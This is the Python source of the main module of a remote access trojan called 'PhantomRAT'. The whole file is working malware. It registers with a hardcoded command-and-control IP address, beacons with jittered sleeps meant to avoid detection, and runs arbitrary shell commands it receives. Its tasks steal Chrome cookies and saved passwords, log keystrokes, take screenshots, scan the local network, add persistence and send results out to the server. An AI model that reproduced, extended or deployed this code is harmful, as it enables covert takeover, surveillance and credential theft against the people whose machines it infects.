
# PhantomRAT Malware Main Entry Point
# Enhanced for performance and stealth
# Updated for PhantomRAT C2 v3.0

import sys
import os
import time
import random
import json
import threading
import socket
import logging
import base64
import hashlib
from datetime import datetime

# Configure minimal logging for stealth
logging.getLogger().setLevel(logging.ERROR)

# ==================== C2 CONFIGURATION ====================
C2_SERVER = "http://141.105.71.196:8000"  # Your C2 IP
IMPLANT_ID = None
ENCRYPTION_KEY = None

# ==================== LOAD ENCRYPTION KEY ====================
def load_encryption_key():
    """Load encryption key from profile"""
    global ENCRYPTION_KEY
    
    try:
        with open('malleable_profile.json', 'r') as f:
            profile = json.load(f)
            ENCRYPTION_KEY = profile.get('encryption', {}).get('key')
            if not ENCRYPTION_KEY:
                # Generate a key based on system info
                host_hash = hashlib.md5(socket.gethostname().encode()).hexdigest()[:32]
                ENCRYPTION_KEY = host_hash
    except FileNotFoundError:
        # Generate default key
        ENCRYPTION_KEY = hashlib.md5(socket.gethostname().encode()).hexdigest()[:32]
    
    # Pad to 32 bytes if needed
    if len(ENCRYPTION_KEY) < 32:
        ENCRYPTION_KEY = ENCRYPTION_KEY.ljust(32, '0')[:32]
    
    return ENCRYPTION_KEY

# Simple encryption class compatible with C2
class PhantomEncryption:
    def __init__(self, key):
        from cryptography.fernet import Fernet
        import base64
        # Ensure key is 32 bytes
        if isinstance(key, str):
            key = key.encode()
        key = key.ljust(32)[:32]
        self.fernet = Fernet(base64.urlsafe_b64encode(key))
    
    def encrypt(self, data):
        """Encrypt data"""
        if isinstance(data, dict):
            data = json.dumps(data)
        if isinstance(data, str):
            data = data.encode()
        return self.fernet.encrypt(data).decode()
    
    def decrypt(self, encrypted_data):
        """Decrypt data"""
        try:
            decrypted = self.fernet.decrypt(encrypted_data.encode()).decode()
            try:
                return json.loads(decrypted)
            except:
                return decrypted
        except Exception as e:
            print(f"[!] Decryption error: {e}")
            return None

# Initialize encryption
load_encryption_key()
encryption = PhantomEncryption(ENCRYPTION_KEY)

# ==================== MODULE IMPORTS WITH ERROR HANDLING ====================
GUI_MODULES_AVAILABLE = False
keylogger = None

print("[*] PhantomRAT Implant Initializing...")

# Try to import GUI modules
try:
    from phantomrat_keylogger import Keylogger
    from phantomrat_screencap import capture_screen
    from phantomrat_webcam import capture_webcam
    from phantomrat_mic import record_audio
    GUI_MODULES_AVAILABLE = True
    print("[+] GUI modules loaded")
except ImportError as e:
    print(f"[-] GUI modules not available: {e}")
    print("[*] Running in headless mode")

# Try to import enhanced system info
try:
    from phantomrat_sysinfo import EnhancedSystemInfo
    SYSINFO_AVAILABLE = True
    system_info = EnhancedSystemInfo()
    print("[+] Enhanced system info module loaded")
except ImportError as e:
    print(f"[-] Enhanced system info not available: {e}")
    SYSINFO_AVAILABLE = False

# Try to import other modules
def safe_import(module_name, class_name=None):
    try:
        module = __import__(module_name)
        if class_name:
            return getattr(module, class_name)
        return module
    except ImportError:
        return None

# Dynamically load modules
phantomrat_process = safe_import('phantomrat_process')
phantomrat_privilege = safe_import('phantomrat_privilege')
phantomrat_fileops = safe_import('phantomrat_fileops')
phantomrat_browser = safe_import('phantomrat_browser')
phantomrat_persistence = safe_import('phantomrat_persistence')
phantomrat_survival = safe_import('phantomrat_survival')

# ==================== BASIC SYSTEM INFO (FALLBACK) ====================
def get_basic_system_info():
    """Fallback system info if enhanced module is not available"""
    import platform
    import psutil
    
    info = {
        'timestamp': datetime.now().isoformat(),
        'basic': {
            'hostname': socket.gethostname(),
            'os': platform.system(),
            'os_version': platform.version(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'python_version': platform.python_version()
        },
        'hardware': {
            'cpu_cores': psutil.cpu_count(logical=True),
            'cpu_physical_cores': psutil.cpu_count(logical=False),
            'memory_total': psutil.virtual_memory().total,
            'memory_available': psutil.virtual_memory().available,
            'boot_time': datetime.fromtimestamp(psutil.boot_time()).isoformat()
        },
        'user': {
            'username': os.getenv('USER', os.getenv('USERNAME', 'unknown')),
            'home_dir': os.path.expanduser('~'),
            'current_dir': os.getcwd()
        },
        'network': {
            'hostname': socket.gethostname(),
            'ip': socket.gethostbyname(socket.gethostname())
        }
    }
    
    # Try to get disk info
    try:
        disk_info = []
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                disk_info.append({
                    'device': partition.device,
                    'mountpoint': partition.mountpoint,
                    'total': usage.total,
                    'used': usage.used,
                    'free': usage.free
                })
            except:
                continue
        info['hardware']['disks'] = disk_info
    except:
        pass
    
    return info

def get_system_info():
    """Get system info using enhanced module or fallback"""
    if SYSINFO_AVAILABLE:
        try:
            return system_info.get_comprehensive_info()
        except Exception as e:
            print(f"[!] Enhanced system info failed: {e}")
            return get_basic_system_info()
    else:
        return get_basic_system_info()

# ==================== C2 COMMUNICATION ====================
def send_to_c2(endpoint, data, method='POST'):
    """Send encrypted data to C2 server"""
    import requests
    
    # Generate implant ID if not set
    global IMPLANT_ID
    if not IMPLANT_ID:
        host_hash = hashlib.md5(socket.gethostname().encode()).hexdigest()[:8]
        IMPLANT_ID = f"GHOST-{host_hash.upper()}"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'X-Phantom': 'Data',
        'X-Implant-ID': IMPLANT_ID
    }
    
    try:
        # Prepare payload
        payload = {
            'implant_id': IMPLANT_ID,
            'data': data,
            'timestamp': time.time()
        }
        
        encrypted_data = encryption.encrypt(payload)
        
        if method.upper() == 'POST':
            response = requests.post(
                f"{C2_SERVER}{endpoint}",
                data=encrypted_data,
                headers=headers,
                timeout=15
            )
        else:
            # For GET requests, include data in headers
            headers['X-Payload'] = encrypted_data[:100]  # First 100 chars
            response = requests.get(
                f"{C2_SERVER}{endpoint}",
                headers=headers,
                timeout=15
            )
        
        if response.status_code == 200:
            # Try to decrypt response
            try:
                decrypted = encryption.decrypt(response.text)
                return decrypted
            except:
                return {'status': 'received', 'raw': response.text}
        
        return {'error': f'HTTP {response.status_code}', 'status': 'failed'}
        
    except requests.exceptions.RequestException as e:
        print(f"[!] Network error: {e}")
        return {'error': str(e), 'status': 'network_error'}
    except Exception as e:
        print(f"[!] C2 communication error: {e}")
        return {'error': str(e), 'status': 'error'}

def exfil_data(data):
    """Exfiltrate data to C2"""
    return send_to_c2('/phantom/exfil', data)

def beacon():
    """Check in with C2 and get tasks"""
    result = send_to_c2('/phantom/beacon', {'type': 'beacon'}, 'GET')
    
    if result and 'tasks' in result:
        return result['tasks']
    elif result and 'status' in result and result['status'] == 'ok':
        return result.get('tasks', [])
    return []

def register_implant():
    """Register with C2 server"""
    global IMPLANT_ID
    
    # Generate unique implant ID
    host_hash = hashlib.md5(socket.gethostname().encode()).hexdigest()[:8]
    IMPLANT_ID = f"GHOST-{host_hash.upper()}"
    
    print(f"[*] Generated implant ID: {IMPLANT_ID}")
    
    registration_data = {
        'type': 'register',
        'implant_id': IMPLANT_ID,
        'system_info': get_system_info(),
        'capabilities': {
            'gui': GUI_MODULES_AVAILABLE,
            'enhanced_info': SYSINFO_AVAILABLE,
            'keylogger': GUI_MODULES_AVAILABLE,
            'screenshot': GUI_MODULES_AVAILABLE,
            'timestamp': time.time()
        }
    }
    
    result = exfil_data(registration_data)
    
    if result and 'status' in result:
        print(f"[+] Registered successfully as {IMPLANT_ID}")
        return True
    else:
        print(f"[-] Registration failed for {IMPLANT_ID}")
        print(f"    Response: {result}")
        return False

# ==================== NETWORK FUNCTIONS ====================
def map_network(subnet=None):
    """Simple network scanning"""
    try:
        import ipaddress
        import subprocess
        import platform
        
        if not subnet:
            # Get local network
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            # Create /24 subnet from local IP
            subnet = '.'.join(local_ip.split('.')[:3]) + '.0/24'
        
        network = ipaddress.ip_network(subnet, strict=False)
        results = []
        
        # Quick ping scan for first 5 hosts
        for ip in list(network.hosts())[:5]:
            try:
                param = '-n' if platform.system().lower() == 'windows' else '-c'
                command = ['ping', param, '1', '-W', '1', str(ip)]
                result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=2)
                
                if result.returncode == 0:
                    results.append(str(ip))
            except:
                continue
        
        return {'subnet': subnet, 'alive_hosts': results, 'total_scanned': 5}
    except Exception as e:
        return {'error': str(e), 'subnet': subnet or 'unknown'}

# ==================== COMMAND HANDLING ====================
def handle_command(task):
    """Handle C2 commands with error handling"""
    if not task or 'command' not in task:
        return {'error': 'No command specified', 'success': False}
    
    cmd = task['command']
    args = task.get('arguments', '')
    task_id = task.get('id')
    
    print(f"[*] Executing command: {cmd}")
    
    result = {
        'command': cmd,
        'task_id': task_id,
        'success': False,
        'output': '',
        'timestamp': time.time()
    }
    
    try:
        if cmd == 'sysinfo':
            if SYSINFO_AVAILABLE:
                # Get comprehensive system info
                info = system_info.get_comprehensive_info()
                # Limit size for transmission
                info_str = json.dumps(info)
                if len(info_str) > 10000:  # If too large, send summary
                    summary = {
                        'timestamp': info.get('timestamp'),
                        'hostname': info.get('basic_info', {}).get('hostname'),
                        'os': info.get('basic_info', {}).get('operating_system'),
                        'cpu_cores': info.get('hardware_info', {}).get('cpu', {}).get('logical_cores'),
                        'memory_total': info.get('hardware_info', {}).get('memory', {}).get('virtual', {}).get('total'),
                        'info_type': 'comprehensive',
                        'size': len(info_str)
                    }
                    result['output'] = summary
                else:
                    result['output'] = info
            else:
                # Use basic system info
                result['output'] = get_basic_system_info()
            
            result['success'] = True
            
        elif cmd == 'sysinfo_basic':
            # Always use basic info (smaller)
            result['output'] = get_basic_system_info()
            result['success'] = True
            
        elif cmd == 'network_scan':
            scan_result = map_network(args if args else None)
            result['output'] = scan_result
            result['success'] = True
            
        elif cmd == 'list_files' and phantomrat_fileops:
            path = args if args else '.'
            files = phantomrat_fileops.list_files(path)
            result['output'] = {'path': path, 'files': files[:50]}  # Limit to 50 files
            result['success'] = True
            
        elif cmd == 'download' and phantomrat_fileops:
            if args:
                # Limit file size for download
                if os.path.exists(args) and os.path.getsize(args) < 1024 * 1024:  # 1MB limit
                    data = phantomrat_fileops.download_file(args)
                    if data:
                        result['output'] = {
                            'file': args,
                            'size': len(data),
                            'data_preview': data[:500]  # First 500 chars
                        }
                        result['success'] = True
                    else:
                        result['output'] = 'File not found or error reading'
                else:
                    result['output'] = 'File too large or does not exist'
            else:
                result['output'] = 'No file specified'
                
        elif cmd == 'execute':
            import subprocess
            try:
                process = subprocess.Popen(
                    args if isinstance(args, str) else ' '.join(args),
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True,
                    text=True
                )
                stdout, stderr = process.communicate(timeout=30)
                result['output'] = {
                    'stdout': stdout[:1000],  # Limit output
                    'stderr': stderr[:1000],
                    'returncode': process.returncode
                }
                result['success'] = process.returncode == 0
            except subprocess.TimeoutExpired:
                result['output'] = 'Command timed out after 30 seconds'
                result['success'] = False
                
        elif cmd == 'list_processes' and phantomrat_process:
            processes = phantomrat_process.list_processes()
            result['output'] = processes[:20]  # First 20 processes
            result['success'] = True
            
        elif cmd == 'kill_process' and phantomrat_process:
            if args:
                try:
                    pid = int(args)
                    success = phantomrat_process.kill_process(pid)
                    result['output'] = f'Process {pid} killed: {success}'
                    result['success'] = success
                except ValueError:
                    result['output'] = 'Invalid PID format'
            else:
                result['output'] = 'No PID specified'
                
        elif cmd == 'browser_data' and phantomrat_browser:
            try:
                cookies = phantomrat_browser.exfil_chrome_cookies()
                passwords = phantomrat_browser.exfil_chrome_passwords()
                result['output'] = {
                    'cookies_count': len(cookies) if cookies else 0,
                    'passwords_count': len(passwords) if passwords else 0,
                    'cookies_sample': cookies[:5] if cookies else [],
                    'passwords_sample': passwords[:5] if passwords else []
                }
                result['success'] = True
            except Exception as e:
                result['output'] = f'Browser data error: {e}'
                
        elif cmd == 'persist' and phantomrat_persistence:
            success = phantomrat_persistence.add_persistence()
            result['output'] = f'Persistence added: {success}'
            result['success'] = success
            
        elif cmd == 'screenshot' and GUI_MODULES_AVAILABLE:
            try:
                screenshot_data = capture_screen()
                if screenshot_data:
                    # For now, just report success
                    result['output'] = f'Screenshot captured ({len(screenshot_data)} bytes)'
                    result['success'] = True
                else:
                    result['output'] = 'Screenshot capture failed'
            except Exception as e:
                result['output'] = f'Screenshot error: {e}'
                
        elif cmd == 'keylog_start' and GUI_MODULES_AVAILABLE:
            global keylogger
            if keylogger is None:
                keylogger = Keylogger()
            keylogger.start_logging()
            result['output'] = 'Keylogger started'
            result['success'] = True
            
        elif cmd == 'keylog_stop' and GUI_MODULES_AVAILABLE and keylogger:
            logs = keylogger.stop_logging()
            result['output'] = f'Keylogger stopped. Log size: {len(logs) if logs else 0} chars'
            result['success'] = True
            
        elif cmd == 'keylog_get' and GUI_MODULES_AVAILABLE and keylogger:
            logs = keylogger.get_log()
            result['output'] = logs[-1000:] if logs else 'No logs available'
            result['success'] = logs is not None
            
        elif cmd == 'self_destruct':
            # Clean up and exit
            result['output'] = 'Self-destruct initiated. Goodbye.'
            result['success'] = True
            threading.Thread(target=cleanup_and_exit).start()
            
        elif cmd == 'ping':
            result['output'] = 'pong'
            result['success'] = True
            
        elif cmd == 'get_id':
            result['output'] = IMPLANT_ID
            result['success'] = True
            
        else:
            result['output'] = f'Unknown or unsupported command: {cmd}'
            result['success'] = False
            
    except Exception as e:
        result['output'] = f'Error executing {cmd}: {str(e)}'
        result['success'] = False
    
    return result

def cleanup_and_exit():
    """Clean up and exit the implant"""
    time.sleep(1)
    print("[*] Self-destruct complete")
    os._exit(0)

# ==================== MAIN LOOP ====================
def sleep_obfuscated(base_duration=30, jitter=0.3):
    """Sleep with obfuscation to avoid pattern detection"""
    # Add jitter
    actual_duration = base_duration * random.uniform(1 - jitter, 1 + jitter)
    
    # Split sleep into smaller intervals with random CPU activity
    end_time = time.time() + actual_duration
    while time.time() < end_time:
        sleep_time = random.uniform(0.5, 2.0)
        time.sleep(sleep_time)
        
        # Perform harmless CPU activity
        _ = [i * i for i in range(random.randint(10, 100))]

def main_loop():
    """Main implant loop"""
    print(f"[*] PhantomRAT v3.0 Implant Starting...")
    print(f"[*] C2 Server: {C2_SERVER}")
    print(f"[*] Enhanced System Info: {'Available' if SYSINFO_AVAILABLE else 'Not available'}")
    print(f"[*] GUI Modules: {'Available' if GUI_MODULES_AVAILABLE else 'Not available'}")
    
    # Register with C2
    max_retries = 3
    for attempt in range(max_retries):
        print(f"[*] Registration attempt {attempt + 1}/{max_retries}")
        if register_implant():
            break
        if attempt < max_retries - 1:
            print(f"[*] Retrying in 10 seconds...")
            time.sleep(10)
    else:
        print("[-] All registration attempts failed. Exiting.")
        return
    
    print(f"[*] Entering main command loop...")
    print(f"[*] Beacon interval: 30-45 seconds")
    print("-" * 50)
    
    task_results = []
    failed_beacons = 0
    max_failed_beacons = 5
    
    while True:
        try:
            # Sleep with obfuscation
            sleep_obfuscated(30, 0.3)
            
            # Check for tasks from C2
            tasks = beacon()
            
            if tasks is None:
                failed_beacons += 1
                print(f"[!] Beacon failed ({failed_beacons}/{max_failed_beacons})")
                
                if failed_beacons >= max_failed_beacons:
                    print("[!] Too many failed beacons. Possible C2 outage.")
                    time.sleep(300)  # Back off for 5 minutes
                    failed_beacons = 0
                continue
            
            # Reset failed beacon counter on success
            failed_beacons = 0
            
            # Process tasks
            for task in tasks:
                print(f"[*] Processing task: {task.get('command', 'unknown')}")
                result = handle_command(task)
                task_results.append(result)
            
            # Send task results back to C2
            if task_results:
                exfil_data({
                    'type': 'task_results',
                    'implant_id': IMPLANT_ID,
                    'task_results': task_results,
                    'timestamp': time.time()
                })
                print(f"[+] Sent {len(task_results)} task results to C2")
                task_results.clear()
            
            # Send heartbeat every few cycles
            if random.random() < 0.25:  # 25% chance each loop
                heartbeat_data = {
                    'type': 'heartbeat',
                    'implant_id': IMPLANT_ID,
                    'alive': True,
                    'timestamp': time.time(),
                    'system_info_brief': {
                        'cpu_percent': os.getloadavg()[0] if hasattr(os, 'getloadavg') else 0,
                        'memory_available': os.sysconf('SC_AVPHYS_PAGES') * os.sysconf('SC_PAGE_SIZE') 
                                          if hasattr(os, 'sysconf') else 0
                    }
                }
                exfil_data(heartbeat_data)
                
        except KeyboardInterrupt:
            print("\n[*] Interrupted by user")
            break
        except Exception as e:
            print(f"[!] Main loop error: {e}")
            import traceback
            traceback.print_exc()
            time.sleep(60)  # Back off on error

# ==================== ENTRY POINT ====================
def main():
    """Main entry point"""
    print("""
    ╔══════════════════════════════════════════════════╗
    ║               PHANTOMRAT IMPLANT                 ║
    ║               v3.0 - Biggest Wells               ║
    ╚══════════════════════════════════════════════════╝
    """)
    
    # Check if running in test mode
    if len(sys.argv) > 1:
        if sys.argv[1] == "--test":
            print("[*] Running in test mode")
            print(f"[*] Basic System Info: {json.dumps(get_basic_system_info(), indent=2)}")
            
            if SYSINFO_AVAILABLE:
                print(f"[*] Enhanced System Info available")
                try:
                    enhanced_info = system_info.get_comprehensive_info()
                    print(f"[*] Enhanced info keys: {list(enhanced_info.keys())}")
                except Exception as e:
                    print(f"[!] Enhanced info error: {e}")
            
            # Test network scan
            print(f"[*] Testing network scan...")
            scan_result = map_network('127.0.0.0/24')
            print(f"[*] Network scan result: {scan_result}")
            
            # Test command execution
            test_commands = [
                {'command': 'ping', 'arguments': ''},
                {'command': 'get_id', 'arguments': ''},
                {'command': 'sysinfo_basic', 'arguments': ''}
            ]
            
            for cmd in test_commands:
                print(f"\n[*] Testing command: {cmd['command']}")
                result = handle_command(cmd)
                print(f"[*] Result: {result}")
            
            print("\n[*] Test complete")
            return
        
        elif sys.argv[1] == "--register":
            print("[*] Registration test only")
            register_implant()
            return
    
    # Run main loop
    try:
        main_loop()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        time.sleep(300)

if __name__ == "__main__":
    # First, load encryption key
    load_encryption_key()
    
    # Check for required dependencies
    try:
        import requests
        import cryptography
        import psutil
    except ImportError as e:
        print(f"[!] Missing required dependency: {e}")
        print("[*] Install with: pip install requests cryptography psutil")
        sys.exit(1)
    
    main()
